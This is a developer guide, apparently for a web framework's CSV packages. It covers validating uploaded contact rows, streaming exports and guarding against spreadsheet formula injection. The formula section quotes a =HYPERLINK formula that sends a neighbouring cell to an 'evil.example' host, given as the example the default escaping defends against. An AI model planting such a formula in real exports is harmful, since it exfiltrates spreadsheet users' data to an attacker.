---
title: Import and export CSV
description: Read an uploaded CSV into validated rows with errors that name the line, and stream exports that spreadsheets open safely.
section:
    title: Data & background work
    order: 7
order: 8
lastUpdated: 2026-10-25
outcomes:
    - "How to read an uploaded CSV into validated rows with errors that name the line"
    - "How to stream an export with `@sdxc/csv` that spreadsheets open safely"
    - "Why the writer neutralizes formulas and when to keep it on"
---

CSV is how most people move data in and out of an app, and both directions have traps: an upload
is untyped text that may be malformed halfway through, and an export can carry a cell a
spreadsheet runs as a formula. This guide imports a contact list and exports it back.
[`@sdxc/csv`](/api/csv) reads and writes RFC 4180 and returns a `Result` instead of throwing,
[`@sdxc/validate`](/api/validate) types each row with a schema, and [`@sdxc/http`](/api/http)
sends the export as a download.

```bash
npm add @sdxc/csv @sdxc/http @sdxc/pagination @sdxc/result @sdxc/validate remix
```

## Describe a row

The reader returns strings only, since guessing would lose data (`"007"` read as a number is
`7`). The types come from a schema of your own, with one field per column header:

```typescript {% title="app/services/imports/contact-row.ts" %}
import * as s from "remix/data-schema";
import { email, min, minLength } from "remix/data-schema/checks";
import * as coerce from "remix/data-schema/coerce";

export const CONTACT_ROW = s.object({
	name: s.string().pipe(minLength(1)),
	email: s
		.string()
		.pipe(email())
		.transform((value) => value.toLowerCase()),
	plan: s.enum_(["free", "pro"]),
	seats: coerce.number().pipe(min(1)),
});

export type Contact = s.InferOutput<typeof CONTACT_ROW>;
```

Columns the schema does not name are stripped, so a spreadsheet with an extra notes column still
imports.

## Parse the file and validate each row

`parse` reads the header row as keys and returns every later record as a
`Record<string, string>`. It fails on text it cannot turn into records at all, such as an
unterminated quote, with the `line` it stopped on. A row that parses but fails the schema is a
different problem, so the import collects every one, since a person fixing a file wants the
whole list at once:

```typescript {% title="app/services/imports/read-contacts.ts" %}
import type { Result } from "@sdxc/result";

import { parse } from "@sdxc/csv";
import { failure, isFailure, success } from "@sdxc/result";
import { validate } from "@sdxc/validate";

import type { Contact } from "~/app/services/imports/contact-row";

import { CONTACT_ROW } from "~/app/services/imports/contact-row";

export type ImportProblem =
	| { kind: "file"; line: number; message: string }
	| { kind: "row"; row: number; messages: string[] };

export class ImportError extends Error {
	override name = "ImportError";
	problems: ImportProblem[];

	constructor(problems: ImportProblem[]) {
		super(`The file has ${problems.length} problem(s)`);
		this.problems = problems;
	}
}

export async function readContacts(
	text: string,
): Promise<Result<Contact[], ImportError>> {
	let parsed = parse(text);
	if (isFailure(parsed)) {
		let { line, message } = parsed.error;
		return failure(new ImportError([{ kind: "file", line, message }]));
	}

	let contacts: Contact[] = [];
	let problems: ImportProblem[] = [];

	for (let [index, record] of parsed.data.rows.entries()) {
		let row = await validate(record, CONTACT_ROW);
		if (isFailure(row)) {
			let messages = row.error.issues.map((issue) => describe(issue));
			problems.push({ kind: "row", row: index + 2, messages });
			continue;
		}
		contacts.push(row.data);
	}

	if (problems.length > 0) return failure(new ImportError(problems));
	return success(contacts);
}
```

The row number is `index + 2`, one for the header and one because people count from one, which
is the number a spreadsheet shows beside the row. `describe` puts the column's name in front of
each message:

```typescript {% title="app/services/imports/read-contacts.ts" %}
interface Issue {
	message: string;
	path?: ReadonlyArray<PropertyKey | { key: PropertyKey }>;
}

function describe(issue: Issue): string {
	let first = issue.path?.[0];
	let column = typeof first === "object" ? first.key : first;
	return column === undefined
		? issue.message
		: `${String(column)}: ${issue.message}`;
}
```

## Accept the upload

The action validates the file field, hands its text to `readContacts`, and either renders the
problems or saves every contact:

```tsx {% title="app/http/controllers/contacts/import.tsx" %}
import { redirect } from "@sdxc/http/response";
import { isFailure } from "@sdxc/result";
import { validate } from "@sdxc/validate";
import * as s from "remix/data-schema";
import * as f from "remix/data-schema/form-data";
import { createAction } from "remix/router";

import { Contacts } from "~/app/models/contacts";
import { readContacts } from "~/app/services/imports/read-contacts";
import { ImportPage } from "~/resources/views/import";
import routes from "~/routes/web";

const UPLOAD = f.object({ file: f.file(s.instanceof_(File)) });

export default createAction(routes.contacts.import, async (ctx) => {
	let upload = await validate(ctx.formData, UPLOAD);
	if (isFailure(upload)) {
		let page = <ImportPage issues={upload.error.issues} />;
		return ctx.render(page, { status: 400 });
	}

	let contacts = await readContacts(await upload.data.file.text());
	if (isFailure(contacts)) {
		let page = <ImportPage problems={contacts.error.problems} />;
		return ctx.render(page, { status: 422 });
	}

	await Contacts.createMany(ctx.db, ctx.account.id, contacts.data);
	return redirect(routes.contacts.index.href(), {
		status: redirect.Status.SeeOther,
	});
});
```

The import is all or nothing: a file with one bad row saves nothing, so uploading it again after
a fix cannot duplicate the rows that were fine.

> [!NOTE]
> D1 commits each statement as it runs, so `Contacts.createMany` keeps the import all or nothing
> only by writing every contact in one statement, such as the multi-row `INSERT` that
> `remix/data-table`'s own `createMany` compiles to, as
> [Query D1 and Durable Object SQL](/docs/data-and-background-work/databases) explains.

> [!WARNING]
> The whole file is read into memory, so cap its size where the body is parsed, with the
> `maxFileSize` option of Remix's `formData()` middleware.

## Stream an export

`streamify` writes rows as a UTF-8 byte stream while they are read. An async generator that pages
through the table with [`Pagination.byKeyset`](/api/pagination) keeps the export's memory flat
however many contacts an account holds:

```typescript {% title="app/http/controllers/contacts/export.ts" %}
import type { Database } from "remix/data-table";

import { streamify } from "@sdxc/csv";
import { attachment, csv } from "@sdxc/http/response";
import { Pagination } from "@sdxc/pagination";
import { isFailure } from "@sdxc/result";
import { createAction } from "remix/router";

import { contacts } from "~/database/schema";
import routes from "~/routes/web";

function contactsAfter(db: Database, accountId: string, after: string | null) {
	return Pagination.byKeyset(db.query(contacts).where({ account_id: accountId }), {
		orderBy: [
			["created_at", "asc"],
			["id", "asc"],
		],
		after,
		limit: 500,
	});
}

async function* contactRows(db: Database, accountId: string) {
	let after: string | null = null;
	do {
		let page = await contactsAfter(db, accountId, after);
		if (isFailure(page)) throw page.error;

		for (let contact of page.data.items) {
			yield { ...contact, created_at: new Date(contact.created_at) };
		}
		after = page.data.cursors.next;
	} while (after !== null);
}

export default createAction(routes.contacts.export, (ctx) => {
	let body = streamify(contactRows(ctx.db, ctx.account.id), {
		columns: [
			{ key: "name", header: "Name" },
			{ key: "email", header: "Email" },
			{ key: "plan", header: "Plan" },
			{ key: "seats", header: "Seats" },
			{ key: "created_at", header: "Added" },
		],
	});

	return csv(body, {
		headers: {
			"Content-Disposition": attachment("contacts.csv"),
			"Cache-Control": "no-store",
		},
	});
});
```

Keyset paging makes the thousandth page cost what the first does, with `id` as the tiebreaker
`byKeyset` requires. A failed page throws inside the generator, which errors the stream, so the
download fails visibly rather than arriving cut short. `columns` lets the header go out before
the first row is read, and a `Date` cell writes as ISO 8601 in UTC.

## Neutralize formulas

A contact named `=HYPERLINK("https://evil.example/?"&B2,"Open")` is just text to your app, but in
a spreadsheet it is a live formula that can send the neighboring cell to someone else's server.
So the writer neutralizes by default: a string cell starting with `=`, `+`, `-`, `@`, tab or
carriage return gets a leading `'`, which a spreadsheet shows as text. Only strings are touched,
so keep numeric columns numeric in the rows you export.

> [!WARNING]
> Turn it off with `escapeFormulas: false` only for a file no spreadsheet opens, such as a feed a
> script reads, where the added `'` would be part of the text the program sees. Any export a
> person downloads keeps the default.

## Test the import

`readContacts` takes text and answers a `Result`, so its test needs no request and no database:

```typescript {% title="app/services/imports/read-contacts.test.ts" %}
import { isFailure, unwrap } from "@sdxc/result";
import { expect, test } from "vitest";

import { readContacts } from "~/app/services/imports/read-contacts";

test("types each row from the schema", async () => {
	let contacts = await unwrap(
		readContacts("name,email,plan,seats\nAda,ADA@example.com,pro,3\n"),
	);

	expect(contacts).toEqual([
		{ name: "Ada", email: "ada@example.com", plan: "pro", seats: 3 },
	]);
});

test("reports every bad row by its spreadsheet row number", async () => {
	let result = await readContacts(
		[
			"name,email,plan,seats",
			"Ada,ada@example.com,pro,3",
			"Grace,not-an-email,gold,0",
		].join("\n"),
	);

	expect(isFailure(result) && result.error.problems).toEqual([
		{ kind: "row", row: 3, messages: expect.any(Array) },
	]);
});
```

To check the export end to end, request `routes.contacts.export` through
`createWebRouter().fetch(...)`, as [Test Workers apps](/docs/operations-and-testing/testing)
shows, and pass the response text back to `parse`.

## Where to go next

- [Validate forms and route params](/docs/building-remix-apps/forms-and-params) — rendering the
  `issues` the upload refusal carries.
- [Background jobs and cron](/docs/data-and-background-work/jobs-and-cron) — moving a large
  import off the request.
- [Stream JSON Lines](/docs/data-and-background-work/json-lines) — the same import and export
  for records with nested data.
